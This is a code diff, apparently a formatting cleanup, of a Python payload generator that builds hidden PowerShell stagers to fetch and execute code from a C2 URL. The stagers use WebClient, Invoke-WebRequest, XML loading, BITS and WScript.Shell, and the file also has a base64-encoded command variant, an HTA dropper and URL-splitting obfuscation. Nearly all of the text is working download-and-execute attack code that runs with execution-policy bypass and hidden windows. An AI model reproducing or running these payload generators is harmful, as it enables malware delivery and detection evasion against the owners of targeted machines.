@@ -61,19 +61,19 @@ def generate_ps_stager(c2_url: str, method: str = "iex") -> str:
         var_wc = _rand_var()
         var_url = _rand_var()
         return (
-            f"powershell -nop -w hidden -ep bypass -c \""
+            f'powershell -nop -w hidden -ep bypass -c "'
             f"${var_url}={url_assembly};"
             f"${var_wc}=New-Object Net.WebClient;"
-            f"IEX(${var_wc}.DownloadString(${var_url}))\""
+            f'IEX(${var_wc}.DownloadString(${var_url}))"'
         )
 
     elif method == "iwr":
         # Invoke-WebRequest variant
         var_url = _rand_var()
         return (
-            f"powershell -nop -w hidden -ep bypass -c \""
+            f'powershell -nop -w hidden -ep bypass -c "'
             f"${var_url}={url_assembly};"
-            f"IEX((Invoke-WebRequest -Uri ${var_url} -UseBasicParsing).Content)\""
+            f'IEX((Invoke-WebRequest -Uri ${var_url} -UseBasicParsing).Content)"'
         )
 
     elif method == "xml":
@@ -81,11 +81,11 @@ def generate_ps_stager(c2_url: str, method: str = "iex") -> str:
         var_xml = _rand_var()
         var_url = _rand_var()
         return (
-            f"powershell -nop -w hidden -ep bypass -c \""
+            f'powershell -nop -w hidden -ep bypass -c "'
             f"${var_url}={url_assembly};"
             f"${var_xml}=New-Object System.Xml.XmlDocument;"
             f"${var_xml}.Load(${var_url});"
-            f"IEX(${var_xml}.command.a.execute)\""
+            f'IEX(${var_xml}.command.a.execute)"'
         )
 
     elif method == "bits":
@@ -93,7 +93,7 @@ def generate_ps_stager(c2_url: str, method: str = "iex") -> str:
         tmp_name = f"C:\\Windows\\Temp\\{secrets.token_hex(4)}.ps1"
         var_url = _rand_var()
         return (
-            f"powershell -nop -w hidden -ep bypass -c \""
+            f'powershell -nop -w hidden -ep bypass -c "'
             f"${var_url}={url_assembly};"
             f"Start-BitsTransfer -Source ${var_url} "
             f"-Destination '{tmp_name}';"
@@ -107,7 +107,7 @@ def generate_ps_stager(c2_url: str, method: str = "iex") -> str:
         var_url = _rand_var()
         var_ws = _rand_var()
         return (
-            f"powershell -nop -w hidden -ep bypass -c \""
+            f'powershell -nop -w hidden -ep bypass -c "'
             f"${var_url}={url_assembly};"
             f"${var_ws}=New-Object -COM WScript.Shell;"
             f"${var_ws}.Run('powershell -nop -w hidden -ep bypass "
@@ -115,10 +115,7 @@ def generate_ps_stager(c2_url: str, method: str = "iex") -> str:
         )
 
     else:
-        raise ValueError(
-            f"Unsupported stager method: {method}. "
-            f"Use: iex, iwr, xml, bits, wscript"
-        )
+        raise ValueError(f"Unsupported stager method: {method}. Use: iex, iwr, xml, bits, wscript")
 
 
 def generate_ps_encoded(c2_url: str) -> str:
@@ -141,15 +138,10 @@ def generate_ps_encoded(c2_url: str) -> str:
     """
     # Build the inner PowerShell script
     var_wc = _rand_var()
-    inner_script = (
-        f"${var_wc}=New-Object Net.WebClient;"
-        f"IEX(${var_wc}.DownloadString('{c2_url}'))"
-    )
+    inner_script = f"${var_wc}=New-Object Net.WebClient;IEX(${var_wc}.DownloadString('{c2_url}'))"
 
     # Encode to UTF-16LE base64 (required by -EncodedCommand)
-    encoded = base64.b64encode(
-        inner_script.encode("utf-16-le")
-    ).decode("ascii")
+    encoded = base64.b64encode(inner_script.encode("utf-16-le")).decode("ascii")
 
     return f"powershell -nop -w hidden -ep bypass -EncodedCommand {encoded}"
 
@@ -359,9 +351,7 @@ def generate_hta_dropper(c2_url: str) -> str:
     """
     # Generate the encoded PowerShell command
     ps_cmd = f"IEX(New-Object Net.WebClient).DownloadString('{c2_url}')"
-    ps_encoded = base64.b64encode(
-        ps_cmd.encode("utf-16-le")
-    ).decode("ascii")
+    ps_encoded = base64.b64encode(ps_cmd.encode("utf-16-le")).decode("ascii")
 
     # Randomize variable names in VBScript
     v_shell = _rand_var_vbs()
@@ -476,6 +466,6 @@ def _split_url_for_obfuscation(url: str) -> list[str]:
     while i < len(url):
         chunk_size = random.randint(3, 10)
         chunk_size = min(chunk_size, len(url) - i)
-        parts.append(url[i:i + chunk_size])
+        parts.append(url[i : i + chunk_size])
         i += chunk_size
     return parts
